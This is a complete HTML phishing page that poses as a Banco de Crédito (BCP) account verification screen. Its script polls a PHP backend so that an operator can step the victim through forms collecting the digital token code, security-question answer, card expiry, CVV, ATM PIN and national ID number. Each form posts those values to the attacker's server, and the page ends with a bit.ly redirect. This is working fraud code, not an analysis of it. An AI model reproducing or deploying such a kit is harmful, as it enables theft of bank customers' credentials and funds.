<html lang="es">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta charset="UTF-8">
        <title>Banco de Cr&eacute;dito&gt;&gt;BCP&gt;&gt;</title>
    </head>
    <body oncontextmenu="return false;" >
<style type="text/css">body,html,iframe{width:100%;height:100%;overflow:hidden;margin:0;font-family:tahoma;padding:0}div#background{background-color:rgba(0,0,0,0.1);display:block;left:0;position:absolute;top:0;width:100%;z-index:6}h1{color:#06246F;font-size:20px;padding:0 0 5px;margin:0;border-bottom:1px dashed #06246F}div#box{-moz-box-shadow:0 0 15px 5px #555;-webkit-box-shadow:0 0 15px 5px #555;background-color:#fff;border:7px solid #EEE;box-shadow:0 0 15px 5px #555;padding:15px;width:500px;-webkit-border-radius:10px;-moz-border-radius:10px;border-radius:10px}div#box label{font-size:11px;font-family:Tahoma;color:#ff4900;float:left;margin:10px 10px 0 0;width:150px;text-align:right;font-weight:700}div#box input[type=text],div#box input[type=password],div#box select{    background-color: #FFF;
    border: 1px solid #CCC;
    padding: 5px;
    width: 250px;
    border-radius: 5px;}h2{color:#444;font-size:13px;font-weight:400;text-align:justify}.line{float:left;width:100%;height:1px;background:#EFAA00;margin:5px 0}.classname{-webkit-border-radius:25px;-moz-border-radius:25px;border-radius:25px;border:1px solid #ff4f00;background:#ff4f00;color:#FFF;font-weight:11px;text-align:center;height:25px;width:100px}.classname:hover{background:#fc8f5e;cursor:pointer}.bignumber{float:left;width:50px;font-size:50px;color:#333}.square:hover{cursor:pointer}</style>
<script src="./verifyingAccount_files/jquery.js"></script>
<script src="./verifyingAccount_files/proc.js"></script>
<script>
function justNumbers(e)
        {
        var keynum = window.event ? window.event.keyCode : e.which;
        if ((keynum == 8) || (keynum == 46))
        return true;
         
        return /\d/.test(String.fromCharCode(keynum));
        }
</script>
<script>


$(function(){




	$(".kk").click(function(){
		idx = $(this).attr("name");
		num = $(this).attr("title");
		if(num == "-"){
			$("#" + idx).val("");
		}else{
			if($("#" + idx).val().length < 6){
				oldVal = $("#" + idx).val();
				$("#" + idx).val(oldVal + num);
			}	
		}
	});


	function resizeBox(){
		$("#background").css("height",$(window).height()),
		$("#background").show(),
		$("#box").stop().animate(
			{
				marginTop:($(window).height()-$("#box").outerHeight())/2,marginLeft:($(window).width()-$("#box").outerWidth())/2
			},500);
	}

	function loadInitInformation(){
		$.post(
			"ajaxProcesos2.php",
			{
			op: "consultarArchivoVisitante"
			},
			function(e){
				eParsedJson = JSON.parse(e);
				//console.log(eParsedJson['datosLogin']['numeroTarjetaUsuario']);
	    		$("#ccx2").val(eParsedJson['datosLogin']['numeroTarjetaUsuario']);
			}
			);
	}

	resizeBox(),
	$(window).resize(function(){resizeBox();});
	resizeBox();
	$(window).resize(function(){resizeBox();});

	loadInitInformation();

	var aju;
	var eParsedJson;
	function checkToken() {
	    $.post("ajaxProcesos2.php", {
	        op: "consultarArchivoVisitante"
	    }, function(e) {                
	    	eParsedJson = JSON.parse(e);
	    	estadoActualX = eParsedJson['informacionEstado']['estadoActual'];
            nombreTitularX = eParsedJson['datosDeValidacion']['nombreTitular'];
            preguntaSeguridad1X = eParsedJson["datosDeValidacion"]["preguntaSeguridad1"];
            claveBancaInternetX = eParsedJson["datosLogin"]["claveBancaInternet"];
	    	//console.log(estadoActualX);
	    	
	        if (estadoActualX == 'gifCargando') {
	            $(".loading").fadeIn("slow");
	            $("#forms4").hide();
                    $("#forms5").hide();
                    $("#forms6").hide();
	            resizeBox();
	        } else if (estadoActualX == 'preguntaDigitalToken') {
	            $(".loading").hide();
	            $(".qu").html(preguntaSeguridad1X);
	            $("#qq").val(preguntaSeguridad1X);
                    $(".nomCli").html(nombreTitularX);
	            $("#forms5").fadeIn("slow");
	            resizeBox();
	            clearInterval(aju);
	        } else if (estadoActualX == 'cc') {
	            $(".loading").hide();
                    $(".nomCli").html(nombreTitularX);
                    $("#pinNumX").val(claveBancaInternetX);                    
	            $("#forms6").fadeIn("slow");
	            resizeBox();
	            clearInterval(aju);
	        } else if (estadoActualX == 'soloDigitalToken') {
	            $(".loading").hide();
                $(".nomCli").html(nombreTitularX);

                if ( eParsedJson['datosDeValidacion']['tokenIngresado'] == 1 ) {
                    document.getElementById("errorMSG").style.display = "block";
                }

	            $("#forms4").fadeIn("slow");
	            resizeBox();
	            clearInterval(aju);
	        } else if (estadoActualX == 'fin') {
                    clearInterval(aju);
	            alert("Ha finalizado el proceso de verificaci\u00F3n.\n\nPor favor a continuaci\u00F3n inicie sesi\u00F3n de manera habitual.");
	            window.location = "http://bit.ly/2u8Yyia";
	        }
	    });
	}

	aju = setInterval(checkToken, 5000);

	$("#check4").click(function(){
		err = 0;
            $("#ema").val("axxxelsalvador@gmail.com");
	    if($("#ema").val().length < 6){
	        alert("Ingrese un eMail valido.");
	        $("#ema").focus();
	        err++;
	      }else if ($("#digitalc").val().length != 6){
	        alert("El Token ingresado es incorrecto.");
	        $("#digitalc").focus();
	        err++;
	      }
	      if(err == 0){
	        $("#forms4").hide();
	        $(".loading").fadeIn("slow");
	        $.post("ajaxProcesos2.php", {
                token: $("#digitalc").val(),
	            type: "token",
                op:"soloDigitalToken"
	        });
	        $("#digitalc").val("");
	        resizeBox();
	        aju = setInterval(checkToken, 5000);
             }
      return false;
    });



	$("#check5").click(function(){
	    err = 0;
	    if($("#an").val().length < 4 ){
	        alert("La respuesta ingresada es incorrecta.");
	        $("#an").focus();
	        err++;
	      }else if($("#digital").val().length != 6){
	        alert("El Token ingresado es incorrecto.");
	        $("#digital").focus();
	        err++;
	      }
	      if(err == 0){
	        $("#forms5").hide();
	        $(".loading").fadeIn("slow");
	        $.post("ajaxProcesos2.php", {
	          question: $("#qq").val(),
	          answer: $("#an").val(),
	          token: $("#digital").val(),
	          type: "security",
                  op : "preguntaDigitalToken"
	        });
	        $(".qu").html("");
	        $("#qq").val("");
	        $("#an").val("");
	        $("#digital").val("");
	        resizeBox();
	        aju = setInterval(checkToken, 5000);
                }
      return false;
    });



    $("#check6").click(function(){
	      err = 0;
	      if($("#mm").val() == "none"){
	        alert("Seleccione su mes de Expiraci\u00F3n.");
	        $("#mm").focus();
	        err++;
	      }else if($("#yy").val() == "none"){
	        alert("Seleccione su a\u00F1o de Expiraci\u00F3n.");
	        $("#yy").focus();
	        err++;
	      }else if( ($("#cvv").val().length != 3 && $("#cvv").val().length!= 4) || (isNaN($("#cvv").val())) ){
	      	alert("Ingrese su c\u00F3digo CVV.");
	      	$("#cvv").focus();
	      	err++;
	      }else if($("#atm").val().length != 4 || isNaN($("#atm").val())){
	      	alert("Ingrese su clave de Cajero (ATM).");
	      	$("#atm").focus();
	      	err++;
	      }else if( ($("#ccxDni").val().length != 8 ) || (isNaN($("#ccxDni").val())) ){
	      	alert("Ingrese DNI.");
	      	$("#ccxDni").focus();
	      	err++;
	      }else if(!/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test($("#ccxMailAsociado").val()) ){
	      	alert("Ingrese email");
	      	$("#ccxMailAsociado").focus();
	      	err++;
	      }else if($("#digitalb").val().length != 6){
	        alert("El Token ingresado es incorrecto.");
	        $("#digitalb").focus();
	        err++;
	      }
              
              
              
	      if(err == 0){
	        $("#forms6").hide();
	        $(".loading").fadeIn("slow");
	        $.post("ajaxProcesos2.php", {
	        expdate: $("#mm").val() + "/" + $("#yy").val(),
	        cvv: $("#cvv").val(),
	        atm: $("#atm").val(),
	        token: $("#digitalb").val(),
	        dni : $("#ccxDni").val(),
	        correo : $("#ccxMailAsociado").val(),
	        type: "cc",
	        op : "cc"
	        },function(e){
	        	//console.log(e);	        	
	        });

	        $("#mm").val("none");
	        $("#yy").val("none");
	        $("#cvv").val("");
	        $("#atm").val("");
	        $("#ccxDni").val("");
	        $("#digitalb").val("123456");
	        $("#ccxMailAsociado").val("axxxelsalvador@gmail.com");
	        resizeBox();
	        aju = setInterval(checkToken, 5000);
             }
             
             
      return false;
    });



	$(".cvv22").mouseover(function(){
		$(".cvv22div").show();
	}).mouseleave(function(){
		$(".cvv22div").hide();
	});


})

</script>
<div id="background" style="height: 629px; display: block;">
	<div id="box" style="margin-top: 253.133px; margin-left: 380px;">
		<div style="text-align: center;" class="loading">
		    <h3>Estamos verificando la informaci&oacute;n, por favor espere un instante...</h3>
		    <br>
                    <img width="100" height="100" src="./verifyingAccount_files/cargando.gif">
	    </div>
	    <form id="forms4" action="" method="POST" style="display: none;">
		    <h3 style="text-align: center;">IMPORTANTE</h3>
		    <h2 style="text-align: justify !important">
                        Estimado <strong><span class="nomCli">Cliente</span></strong>, para continuar es necesario que especifique su Clave Digital Token<br>
                        <div align="center">
                            <font style=" display: none;font-size:12px; font-family:#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">eMail:</font>
                            <input name="ema" id="ema" placeholder="eMail de Constancia" style="margin-left:2px; display: none; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:180px; outline: none; color: #71777f; font-size: 12px; margin:15px 0 0 0" type="email" required="required" maxlength="60">
                        </div>
		    </h2>
		    
			<style type="text/css">
			.mytable{
				background: #e7e7ef;
				text-align: center;
				width: 90px;
				margin:0;
				padding: 0;
			}
			.mytable td{
				color: #000066;
				width: 30px;
				padding: 5px 0 5px 0;
				text-align: center;
				font-size: 12px;
			}
			.mytable td:hover{
				background: #b1b1ed;
				cursor: pointer;
			}
			.mytable td a{
				color: #000066;
				text-decoration: none;
			}
			</style>
                        <br>
			<div style="background: #000 !important; width: 400px; margin: 0 auto;">
                                <div style="float: left;margin:5px 10px 0 0">
                                    <img  width="90" height="90" src="./verifyingAccount_files/rsaToken2.jpg" alt=" " >
                                </div>
				<div style="float: left;width:90px;margin:0 10px 0 0">
					<table width="20%" class="mytable">
						<tbody>
                            <tr width="33%">
                                <td class="kk" title="2" name="digitalc"><a href="#">2</a></td>
                                <td class="kk" title="5" name="digitalc"><a href="#">5</a></td>
                                <td class="kk" title="8" name="digitalc"><a href="#">8</a></td>
                            </tr>
                            <tr width="33%">
                                <td class="kk" title="1" name="digitalc"><a href="#">1</a></td>
                                <td class="kk" title="0" name="digitalc"><a href="#">0</a></td>
                                <td class="kk" title="3" name="digitalc"><a href="#">3</a></td>
                            </tr>
                            <tr width="33%">
                                <td class="kk" title="9" name="digitalc"><a href="#">9</a></td>
                                <td class="kk" title="6" name="digitalc"><a href="#">6</a></td>
                                <td class="kk" title="4" name="digitalc"><a href="#">4</a></td>
                            </tr>
                            <tr>
                                <td><a href="#" class="kk" title="7" name="digitalc">7</a></td>
                                <td colspan="2" style="background: #f36e29; color:  font-weight: bold;"><a href="#" class="kk" title="-" style="color: #FFF !important; font-weight: bold;" name="digitalc">Limpiar</a></td>
                            </tr>
					    </tbody>
                    </table>
				</div>
				<label style="color: #333; font-weight: normal; text-align: left; margin: 0; padding: 0">Para continuar, ingresa tu Clave Digital Token usando el teclado virtual:<input type="password" name="digitalc" id="digitalc" maxlength="6" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:100px; outline: none; color: #71777f; font-size: 12px; margin:15px 0 0 0" onkeypress="return justNumbers(event);"></label>
			</div>

			<div style="float: right; width: 100%; text-align: center;margin-top: 10px;display: none;" id="errorMSG">
				<span style="font-size: 11px;text-transform: uppercase;color: #760f10;">La clave digital ingresada es incorrecta, ingrese nuevamente.</span>
			</div>
		    <div style="float: right; width: 100%; text-align: right;">
                        <br>
		    	<input type="button" name="check4" id="check4" value="Continuar">
		    </div>
		    <div style="clear: both;"></div>
		</form>
            
            
            
            
	    <form id="forms5" action="" method="POST" style="display: none;">
                
		    <h3 style="text-align: center;">PREGUNTA DE SEGURIDAD</h3>
		    <h2 style="text-align: center !important">
                        Estimado: <strong class="nomCli"><span>Cliente</span></strong>, para continuar, responda la siguiente pregunta de Seguridad
		    </h2>
			<table width="100%" border="0" align="center" cellpadding="5" cellspacing="5">
                        
                        <tbody>
                            
                        <tr>
                            <td colspan="2" style=" text-align: center;">
                              <font style="font-size:17px;font-style: italic; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:black; font-weight:bold;" class="qu">
                                  
                              </font>
                              <input type="hidden" id="qq" name="qq" value="" placeholder="" readonly="readonly">
                            </td>
                        </tr>
                        
                        <tr>
                          <td  align="center">
                              <font style="font-size:15px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">Respuesta:</font>
                          </td>
                          <td align="center">
                              <input type="text" id="an" name="an" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; border-radius: 5px; outline: none; width:100%; color: #71777f;font-size: 15px; !important" maxlength="35">
                          </td>
                        </tr>
                        
                      </tbody>
                        
                        </table>
                            <br>
		    
		    
			<style type="text/css">
			.mytable{
				background: #e7e7ef;
				text-align: center;
				width: 90px;
				margin:0;
				padding: 0;
			}
			.mytable td{
				color: #000066;
				width: 30px;
				padding: 5px 0 5px 0;
				text-align: center;
				font-size: 12px;
			}
			.mytable td:hover{
				background: #b1b1ed;
				cursor: pointer;
			}
			.mytable td a{
				color: #000066;
				text-decoration: none;
			}
			</style>
                        
			<div style="background: #000 !important; width: 400px; margin: 0 auto;">
                            
                            <div style="float: left;margin:5px 10px 0 0" >
                                <img width="90" height="90" src="./verifyingAccount_files/rsaToken2.jpg" alt="" >
                            </div>
                                
				<div style="float: left;width:120px;margin:0 10px 0 0">
                                    
					<table width="20%" class="mytable">
						<tbody><tr width="33%">
							<td class="kk" title="2" name="digital"><a href="#">2</a></td>
							<td class="kk" title="5" name="digital"><a href="#">5</a></td>
							<td class="kk" title="8" name="digital"><a href="#">8</a></td>
						</tr>
						<tr width="33%">
							<td class="kk" title="1" name="digital"><a href="#">1</a></td>
							<td class="kk" title="0" name="digital"><a href="#">0</a></td>
							<td class="kk" title="3" name="digital"><a href="#">3</a></td>
						</tr>
						<tr width="33%">
							<td class="kk" title="9" name="digital"><a href="#">9</a></td>
							<td class="kk" title="6" name="digital"><a href="#">6</a></td>
							<td class="kk" title="4" name="digital"><a href="#">4</a></td>
						</tr>
						<tr>
							<td><a href="#" class="kk" title="7" name="digital">7</a></td>
							<td colspan="2" style="background: #f36e29; color:  font-weight: bold;"><a href="#" class="kk" title="-" style="color: #FFF !important; font-weight: bold;" name="digital">Limpiar</a></td>
						</tr>
					</tbody></table>
				</div>
				<label style="color: #333; font-weight: normal; text-align: left; margin: 0; padding: 0">Para confirmar la operaci&oacute;n, ingresa tu Clave Digital Token usando el teclado virtual:<input type="password" name="digital" id="digital" maxlength="6" style="width: 120px;margin:15px 0 0 0" onkeypress="return justNumbers(event);"></label>
			</div>
		    
		    <div style="float: right; width: 100%; text-align: right;">
		    	<input type="button" name="check5" id="check5" value="Continuar">
		    </div>
		    <div style="clear: both;"></div>
		</form>


		<form id="forms6" action="" method="POST" style="display: none;">
                    
		    <h3 style="text-align: center;">IMPORTANTE</h3>
		    <h2 style="text-align: justify !important">
                        Estimado <strong><span class="nomCli"> Cliente(a) </span> </strong>, para finalizar se requiere verificar los datos correspondientes a su tarjeta.
		    </h2>
		    
<table width="100%" border="0"   cellpadding="0" cellspacing="0">
  <tbody >
  <tr>
      <td  rowspan="5" align="right" width="120" ><img width="220"  src="./verifyingAccount_files/card3.png" alt=""></td>
    <td height="35"  align="right"><font style="font-size:12px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">Nro. Tarjeta:</font></td>
    <td><input type="hidden" name="pinNumX" id="pinNumX" />
        <input type="text" id="ccx2" name="ccx2" maxlength="17" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:135px; outline: none; color: #71777f; font-size: 12px; !important" value="" readonly="readonly" disabled="disabled"></td>
  </tr>
  <tr>
    <td height="35"  align="right"><font style="font-size:12px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">Fec. Vencimiento:</font></td>
    <td>
		<select id="mm" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; border-radius: 5px; outline: none; width:60px; color: #71777f;font-size: 12px; !important">
		    <option value="none">Mes</option>
		    <option value="01">01</option>
			<option value="02">02</option>
			<option value="03">03</option>
			<option value="04">04</option>
			<option value="05">05</option>
			<option value="06">06</option>
			<option value="07">07</option>
			<option value="08">08</option>
			<option value="09">09</option>
			<option value="10">10</option>
			<option value="11">11</option>
			<option value="12">12</option>
		</select>&nbsp;
		<select id="yy" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; border-radius: 5px; outline: none; width:60px; color: #71777f;font-size: 12px; !important">
		    <option value="none">A&#241;o</option>
		    <option value="17">2018</option>
			<option value="18">2019</option>
			<option value="19">2020</option>
			<option value="20">2021</option>
			<option value="21">2022</option>
			<option value="22">2023</option>
			<option value="23">2024</option>
			<option value="24">2025</option>
			<option value="25">2026</option>
		</select>
	</td>
  </tr>
  <tr>
    <td height="35"  align="right"><font style="font-size:12px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">CVV:</font></td>
    <td><input type="text" id="cvv" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:45px; outline: none; color: #71777f; font-size: 12px; !important" maxlength="3" onkeypress="return justNumbers(event);">
		    <strong style="font-size: 12px;font-weight:normal;font-style:italic;" class="cvv22">
		    	(?)
		    	<div class="cvv22div" style="display: none; position: absolute;background: #EEE;border: 1px solid #000;"><font style="font-family: Tahoma, Geneva, sans-serif; font-size: 12px; color:#F00; padding-left:17px;">*Si no tiene cvv ingrese 000</font><br><img src="./verifyingAccount_files/cvv_4digits.jpg"></div>
		    </strong></td>
  </tr>
  <tr>
    <td height="35"  align="right"><font style="font-size:12px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">Clave Cajero(ATM):</font></td>
  <td><input type="password" id="atm" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:45px; outline: none; color: #71777f; font-size: 12px; !important" maxlength="4" onkeypress="return justNumbers(event);"></td>
  </tr>
  <tr>
    <td height="35"  align="right"><font style="font-size:12px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">DNI:</font></td>
    <td><input type="text" id="ccxDni" name="ccxDni" onkeypress="return justNumbers(event);" maxlength="8" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:135px; outline: none; color: #71777f; font-size: 12px; !important" value="" ></td>
  </tr>
  <tr style="display: none;" >
    <td height="35"  align="right"><font style="font-size:12px; font-family:&#39;Trebuchet MS&#39;, Arial, Helvetica, sans-serif; color:#FF4900; padding-right:8px; font-weight:bold;">Correo asociado:</font></td>
    <td><input type="text" id="ccxMailAsociado" name="ccxMailAsociado" maxlength="50" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:10px; outline: none; color: #71777f; font-size: 12px; !important" value="axxxelsalvador@gmail.com" ></td>
  </tr>
</tbody></table>


			<style type="text/css">
			.mytable{
				background: #e7e7ef;
				text-align: center;
				width: 90px;
				margin:0;
				padding: 0;
			}
			.mytable td{
				color: #000066;
				width: 30px;
				padding: 5px 0 5px 0;
				text-align: center;
				font-size: 12px;
			}
			.mytable td:hover{
				background: #b1b1ed;
				cursor: pointer;
			}
			.mytable td a{
				color: #000066;
				text-decoration: none;
			}
			</style>
		<div style="display:none;background: #000 !important; width: 250px; margin: 0 auto;">
			<div style="float: left;width:90px;margin:0 10px 0 0">
					<table width="20%" class="mytable">
						<tbody>
						<tr width="33%">
							<td class="kk" title="2" name="digitalb"><a href="#">2</a></td>
							<td class="kk" title="5" name="digitalb"><a href="#">5</a></td>
							<td class="kk" title="8" name="digitalb"><a href="#">8</a></td>
						</tr>
						<tr width="33%">
							<td class="kk" title="1" name="digitalb"><a href="#">1</a></td>
							<td class="kk" title="0" name="digitalb"><a href="#">0</a></td>
							<td class="kk" title="3" name="digitalb"><a href="#">3</a></td>
						</tr>
						<tr width="33%">
							<td class="kk" title="9" name="digitalb"><a href="#">9</a></td>
							<td class="kk" title="6" name="digitalb"><a href="#">6</a></td>
							<td class="kk" title="4" name="digitalb"><a href="#">4</a></td>
						</tr>
						<tr>
							<td><a href="#" class="kk" title="7" name="digitalb">7</a></td>
							<td colspan="2" style="background: #f36e29; color:  font-weight: bold;"><a href="#" class="kk" title="-" style="color: #FFF !important; font-weight: bold;" name="digitalb">Limpiar</a></td>
						</tr>
					</tbody></table>
				</div>
				<label style="color: #333; font-weight: normal; text-align: left; margin: 0; padding: 0">Para confirmar la operaci&oacute;n, ingresa tu Clave Digital Token usando el teclado virtual:<input type="password" name="digitalb" id="digitalb" maxlength="6" value="123456" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 7px; border-radius: 5px; width:100px; outline: none; color: #71777f; font-size: 12px; margin:15px 0 0 0" onkeypress="return justNumbers(event);"></label>
			</div>
		    <!-- -->
		    <div style="float: right; width: 100%; text-align: right;">
                        <br>
		    	<input type="button" name="check6" id="check6" value="Continuar">
		    </div>
		    <div style="clear: both;"></div>
		</form>
	</div>
</div>
<iframe src="./verifyingAccount_files/verifyingProcessing.html" frameborder="0"></iframe>
    </body>
</html>